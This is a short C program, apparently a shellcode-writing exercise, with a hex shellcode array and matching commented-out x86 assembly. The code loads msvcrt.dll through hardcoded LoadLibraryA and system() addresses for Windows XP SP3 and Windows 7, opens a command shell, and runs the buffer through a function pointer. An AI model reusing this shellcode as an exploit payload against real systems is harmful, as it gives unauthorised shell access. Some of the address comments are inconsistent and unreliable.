#include "stdio.h"
#include <string.h>
#include <windows.h>
//LoadLibraryA  win7  0x77e1b177
//system  win7  0x77e1b177
unsigned char shellcode[]=
"\x55\x8b\xec\x33\xc0\x50\x50\x50"
"\xc6\x45\xf4\x4d\xc6\x45\xf5\x53"
"\xc6\x45\xf6\x56\xc6\x45\xf7\x43"
"\xc6\x45\xf8\x52\xc6\x45\xf9\x54"
"\x88\x45\xfa\x36\x8d\x45\xf4\x50"
"\xba\x7b\x1d\x80\x7c\xff\xd2\x55"
"\x8b\xec\x83\xec\x2c\xb8\x63\x6f"
"\x6d\x6d\x89\x45\xf4\xb8\x61\x6e"
"\x64\x2e\x89\x45\xf8\xb8\x63\x6f"
"\x6d\x22\x89\x45\xfc\x33\xd2\x88"
"\x55\xff\x8d\x45\xf4\x50\xb8\xc7"
"\x93\xbf\x77\xff\xd0\x83\xc4\x02"
"\x8b\xe5";
void  main()
{
/*
	__asm{
		//首先要LoadLibrary("msvcrt.dll");
			push ebp
			mov ebp,esp
			xor eax,eax
			push eax
			push eax
			push eax
			mov byte ptr [ebp-0Ch],4Dh;	//m
			mov byte ptr [ebp-0Bh],53h;	//s
			mov byte ptr[ebp-0Ah],56h;	//v
			mov byte ptr[ebp-09h],43h;	//c
			mov byte ptr[ebp-08h],52h;	//r
			mov byte ptr[ebp-07h],54h;	//t
			mov byte ptr[ebp-06h],al;
//			mov byte ptr[ebp-06h],2Eh;	//.
//			mov byte ptr[ebp-05h],44h;	//d
//			mov byte ptr[ebp-04h],4Ch;	//l
//			mov byte ptr[ebp-03h],4Ch;	//l
			lea eax,ss:[ebp-0Ch]
			push eax
			mov edx,0x7c801d7b //LoadLibraryA win7 0x76c92804  xp sp3 0x7c801d7b
			call edx
			//然后是开一个dos窗口：
			push ebp 
			mov ebp, esp 
			sub esp, 0x2C 
			mov eax, 0x6D6D6F63 
			mov dword ptr [ebp-0x0C], eax
			mov eax, 0x2E646E61 
			mov dword ptr [ebp-0x8], eax
			mov eax, 0x226D6F63 
			mov dword ptr [ebp-0x4], eax
			xor edx, edx 
			mov byte ptr [ebp-0x1], dl 
			lea eax, dword ptr [ebp-0xC]
			push eax 
			mov eax, 0x77bf93c7 //system  win7 0x7515b177  xp sp3 0x77bf93c7
			call eax
			add esp,2
			mov esp,ebp
	}
*/
	( ( void (*)(void) ) &shellcode )();
	exit(0);
}
 